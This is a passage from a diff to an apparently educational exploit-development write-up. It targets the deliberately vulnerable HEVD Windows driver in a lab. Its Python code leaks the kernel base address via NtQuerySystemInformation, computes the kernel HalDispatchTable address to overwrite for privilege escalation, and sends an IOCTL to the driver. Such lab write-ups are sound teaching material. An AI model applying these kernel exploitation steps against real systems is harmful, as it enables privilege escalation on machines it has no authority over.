@@ -230,6 +230,320 @@ def base():
         print("[!] NtQuerySystemInformation failed. NTSTATUS: {}").format(hex(result))
  ```
 
+Some parts that need explaining here: I just took the hardcoded error codes from FuzzySec's Powershell script and hardcoded them here. You'll notice that we call the API twice, now why is that? Well, we don't know the buffer length for the output parameters yet. So we'll call it twice: 
++ 1st, the API call ends in an error because we have tried to stuff our results into a 0-sized buffer
++ 2nd, we get the returned length in `system_information_length` and then we can call the API again with the correct buffer length by re-establishing the `system_information` string buffer with `system_information = create_string_buffer(system_information_length.value)`.
+
+FuzzySec accomplishes this by putting his API calls into a `while True` loop with a `break` on success and GradiusX does basically what I did and calls the API twice. 
+
+If you look at the MSDN and githubgist documentation, `system_information` is now a struct of type `_SYSTEM_MODULE_INFORMATION`. This prototype is broken down thusly:
+```C
+struct _SYSTEM_MODULE_INFORMATION // Size=284
+{
+    ULONG Count; // Size=4 Offset=0
+    SYSTEM_MODULE Modules[1]; // Size=280 Offset=4
+};
+```
+
+Nice, that's easy enough, let's take a look at this goddamn `SYSTEM_MODULE` member:
+```C
+typedef struct _SYSTEM_MODULE // Size=280
+{
+    USHORT Reserved1; // Size=2 Offset=0
+    USHORT Reserved2; // Size=2 Offset=2
+    ULONG ImageBaseAddress; // Size=4 Offset=4
+    ULONG ImageSize; // Size=4 Offset=8
+    ULONG Flags; // Size=4 Offset=12
+    USHORT Index; // Size=2 Offset=16
+    USHORT Rank; // Size=2 Offset=18
+    USHORT LoadCount; // Size=2 Offset=20
+    USHORT NameOffset; // Size=2 Offset=22
+    UCHAR Name[256]; // Size=256 Offset=24
+} SYSTEM_MODULE;
+```
+
+Whew, thats quite a lot, but helpfully the size and offsets are annotated in the documentation. Sidenote: `sizeof(ctypes.c_ulong())` on Linux is 8 bytes but on Windows it's 4 bytes, WTF?
+
+So what we have now is `system_information` returned to us in the form of a `_SYSTEM_MODULE_INFORMATION` struct. GradiusX convienantly hardcoded a class definition in his script for this struct and I've put it in my final commented script, feel free to use it (I did not, I am very unsmart.)
+
+Somehow, the first 4 bytes of this returned struct is the amount of handles to Images returned, I'm still not understanding 100% how this works. I can't account for these 4 bytes in the documentation. If we call our script we have right now, I get this returned in my terminal: 
+```
+C:\Users\IEUser\Desktop>python address.py
+[*] Calling NtQuerySystemInformation w/SystemModuleInformation class
+[*] Success, allocated 52828-byte result buffer.
+```
+
+So we now have the length of the returned structure (52828 bytes). If we slice off the first eight bytes of this returned struct, which by the way, I treated as a long string in Python, we can actually store those 8 bytes in a buffer and get their decimal value with the following code thanks to GradiusX: 
+```python
+handle_num = c_ulong()
+memmove(addressof(handle_num), create_string_buffer(system_information[:8]), sizeof(handle_num))
+print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))
+```
+If we append this to our script and run it, we get the following terminal output:
+```
+C:\Users\IEUser\Desktop>python address.py
+[*] Calling NtQuerySystemInformation w/SystemModuleInformation class
+[*] Success, allocated 52828-byte result buffer.
+[*] Result buffer contains 186 SystemModuleInformation objects
+```
+
+We can do some math now. We returned 186 SystemModuleInformation objects. Each object is 284 bytes according to the documentation. That brings us to 52824 bytes. So there we have it, we have something like: 4 bytes telling us how many objects returned and then 52824 bytes of 284 byte structs. This makes sense to me, I just don't know where we can find those initial 4 bytes, let me know if you know please. 
+
+Moving on, let's just slice those first four bytes off so we can deal with the remaining objects which are all instances of `_SYSTEM_MODULE_INFORMATION` stucts!
+
+We can parse them accordingly! Let's redefine `system_information` without the first 4 bytes: 
+```python
+system_information = create_string_buffer(system_information[8:])
+```
+
+Since we know the offsets, we can just hardcode them and treat `system_information` as a long string. Let's parse the string using our offsets from the documentation and just return every single `ImageName` member of the struct. We can see from the documentation that this member is `256` bytes long and is located at offset `+0x24`. And this struct is `280` bytes long. So we can keep a counter variable that will increment every iteration `280` bytes and we can get a list of the module names with the `ImageName` member. Let's see if this works and then we will know positively that we can parse the struct the way we need to. This can be accomplished with the following loop in our exploit script: 
+```python
+import ctypes, sys, struct
+from ctypes import *
+from subprocess import *
+
+kernel32 = windll.kernel32
+ntdll = windll.ntdll
+
+def address_find():
+    print("[*] Calling NtQuerySystemInformation w/SystemModuleInformation class" )
+    system_information = create_string_buffer(0)
+    system_information_length = c_ulong(0)
+    ntdll.NtQuerySystemInformation(
+        0xb,
+        system_information,
+        len(system_information),
+        addressof(system_information_length)
+    )
+
+    system_information = create_string_buffer(system_information_length.value)
+
+    result = ntdll.NtQuerySystemInformation(
+        0xb,
+        system_information,
+        len(system_information),
+        addressof(system_information_length)
+    )
+
+    if result == 0x00000000:
+        print("[*] Success, allocated {}-byte result buffer.".format(str(len(system_information))))
+
+    elif result == 0xC0000004:
+        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)")
+
+    elif result == 0xC0000005:
+        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)")
+
+    else:
+        print("[!] NtQuerySystemInformation failed. NTSTATUS: {}").format(hex(result))
+
+    handle_num = c_ulong()
+    memmove(addressof(handle_num), create_string_buffer(system_information[:8]), sizeof(handle_num))
+    print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))
+
+    system_information = create_string_buffer(system_information[8:])
+
+    counter = 0
+    for x in range(0,handle_num.value):
+        image_name = system_information[counter + 24: counter + 284].strip("\x00")
+        print(image_name)
+        counter += 284
+
+address_find()
+```
+
+Running this gives me the following terminal output:
+```
+C:\Users\IEUser\Desktop>python address.py
+[*] Calling NtQuerySystemInformation w/SystemModuleInformation class
+[*] Success, allocated 52828-byte result buffer.
+[*] Result buffer contains 186 SystemModuleInformation objects
+\SystemRoot\system32\ntkrnlpa.exe
+\SystemRoot\system32\halmacpi.dll
+\SystemRoot\system32\kdcom.dll
+\SystemRoot\system32\mcupdate_GenuineIntel.dll
+\SystemRoot\system32\PSHED.dll
+\SystemRoot\system32\BOOTVID.dll
+\SystemRoot\system32\CLFS.SYS
+\SystemRoot\system32\CI.dll
+\SystemRoot\system32\drivers\Wdf01000.sys
+\SystemRoot\system32\drivers\WDFLDR.SYS
+\SystemRoot\system32\drivers\ACPI.sys
+\SystemRoot\system32\drivers\WMILIB.SYS
+...[snip]...
+```
+
+It looks like we can parse this struct reasonably well with our offsets and treating it as a string with our loop. Granted this part was super confusing for me because of mystery 4 bytes, but this worked pretty reliably. We returned the names of every module. We're interested in this first entry `ntkrnlpa.exe`. That's the kernel image and if we find that in our loop, we should then go find it's base address which is held in that struct's `ULONG ImageBaseAddress` member at offset `0x4`. 
+
+So what we'll do, is iterate over our returned struct grabbing out image names, if the image name has `ntkrnl` in the string, we will go to that struct's `0x4` offset and grab the address which spans to offset `0x8`. This can accomplished with the following loop, replacing our old loop:
+```python
+counter = 0
+    for x in range(0,handle_num.value):
+        image_name = system_information[counter + 24: counter + 284].strip("\x00")
+        if "ntkrnl" in image_name:
+            image_name = image_name.split("\\")[-1]
+            print("[*] Kernel Type: {}".format(image_name))            
+            base = c_ulong()
+            memmove(addressof(base), create_string_buffer(system_information[counter + 4: counter + 8]), sizeof(base))
+            kernel_base = hex(base.value)
+            if kernel_base[-1] == "L":
+                kernel_base = kernel_base[:-1]
+                print("[*] Kernel Base: {}".format(kernel_base))
+                return image_name, kernel_base
+        counter += 284
+```
+
+Running this in the terminal gives me the following output:
+```
+C:\Users\IEUser\Desktop>python address.py
+[*] Calling NtQuerySystemInformation w/SystemModuleInformation class
+[*] Success, allocated 52828-byte result buffer.
+[*] Result buffer contains 186 SystemModuleInformation objects
+[*] Kernel Type: ntkrnlpa.exe
+[*] Kernel Base: 0x82850000
+```
+
+Awesome, we actually returned the kernel image base address. We can now proceed with our plans. (I used the FuzzySec powershell script throughout this process to make sure my returned values were correct). 
+
+That was probably the hardest part, now we need to make a few API calls to get a handle to the kernel (`LoadLibraryA`) and also we need the userland `HalDispatchTable` (`GetProcAddress`). 
+
+We will also need to calculate the address of `HalDispatchTable` in kernel space using FuzzySec's math we already outlined. 
+
+Let's add everything to our first script with the `send_buf` function commented out for now. We're now here:
+```python
+import ctypes, sys, struct
+from ctypes import *
+from subprocess import *
+
+kernel32 = windll.kernel32
+ntdll = windll.ntdll
+
+def address_find():
+    print("[*] Calling NtQuerySystemInformation w/SystemModuleInformation class" )
+    system_information = create_string_buffer(0)
+    system_information_length = c_ulong(0)
+    ntdll.NtQuerySystemInformation(
+        0xb,
+        system_information,
+        len(system_information),
+        addressof(system_information_length)
+    )
+
+    system_information = create_string_buffer(system_information_length.value)
+
+    result = ntdll.NtQuerySystemInformation(
+        0xb,
+        system_information,
+        len(system_information),
+        addressof(system_information_length)
+    )
+
+    if result == 0x00000000:
+        print("[*] Success, allocated {}-byte result buffer.".format(str(len(system_information))))
+
+    elif result == 0xC0000004:
+        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)")
+
+    elif result == 0xC0000005:
+        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)")
+
+    else:
+        print("[!] NtQuerySystemInformation failed. NTSTATUS: {}").format(hex(result))
+
+    handle_num = c_ulong()
+    memmove(addressof(handle_num), create_string_buffer(system_information[:8]), sizeof(handle_num))
+    print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))
+
+    system_information = create_string_buffer(system_information[8:])
+
+    counter = 0
+    for x in range(0,handle_num.value):
+        image_name = system_information[counter + 24: counter + 284].strip("\x00")
+        if "ntkrnl" in image_name:
+            image_name = image_name.split("\\")[-1]
+            print("[*] Kernel Type: {}".format(image_name))            
+            base = c_ulong()
+            memmove(addressof(base), create_string_buffer(system_information[counter + 4: counter + 8]), sizeof(base))
+            kernel_base = hex(base.value)
+            if kernel_base[-1] == "L":
+                kernel_base = kernel_base[:-1]
+                print("[*] Kernel Base: {}".format(kernel_base))
+                return image_name, kernel_base
+        counter += 284
+
+def hal_calc(image_name, kernel_base):
+
+    # grab a handle to ntkrnl
+    kern_handle = kernel32.LoadLibraryA(image_name)
+    if kern_handle == None:
+        print("[!] LoadLibrary failed to retrieve handle to kernel with error: {}".format(str(GetLastError())))
+        sys.exit(1)
+    print("[*] Kernel Handle: {}".format(hex(kern_handle)))
+
+    # use our handle to get the address of the HalDispatchTable in userland
+    userland_hal = kernel32.GetProcAddress(kern_handle, "HalDispatchTable")
+    if userland_hal == None:
+        print("[!] GetProcAddress failed to retrieve HDT address with error: {}".format(str(GetLastError())))
+        sys.exit(1)
+    print("[*] Userland HalDispatchTable Address: {}".format(hex(userland_hal)))
+
+    # using FuzzySec's powershell script as guide for math: $HalDispatchTable = $HALUserLand.ToInt32() - $KernelHanle + $KernelBase
+    kernel_hal = userland_hal - kern_handle + int(kernel_base, 16)
+    printable_hal = hex(kernel_hal)
+    if printable_hal[-1] == "L":
+        printable_hal = printable_hal[:-1]
+    print("[*] Kernel HalDispatchTable Address: {}".format(printable_hal))
+
+    # we want hal + 0x4, that's the function pointer we want to overwrite
+    target_hal = kernel_hal + 0x4
+    print("[*] Target HalDispatchTable Function Pointer at: {}".format(hex(target_hal)[:-1]))
+
+    return target_hal
+
+
+def send_buf():
+    hevd = kernel32.CreateFileA(
+        "\\\\.\\HackSysExtremeVulnerableDriver", 
+        0xC0000000, 
+        0, 
+        None, 
+        0x3, 
+        0, 
+        None)
+    
+    if (not hevd) or (hevd == -1):
+        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
+        sys.exit(1)
+    else:
+        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
+
+    buf = "A" * 1000
+    buf_length = len(buf)
+    
+    result = kernel32.DeviceIoControl(
+        hevd,
+        0x22200b,
+        buf,
+        buf_length,
+        None,
+        0,
+        byref(c_ulong()),
+        None
+    )
+
+    if result != 0:
+        print("[*] Buffer sent to driver successfully.")
+    else:
+        print("[!] Payload failed. Last error: " + str(GetLastError()))
+
+image_name, kernel_base = address_find()
+hal_calc(image_name, kernel_base)
+```
+
+
+
+
+
 
 
 
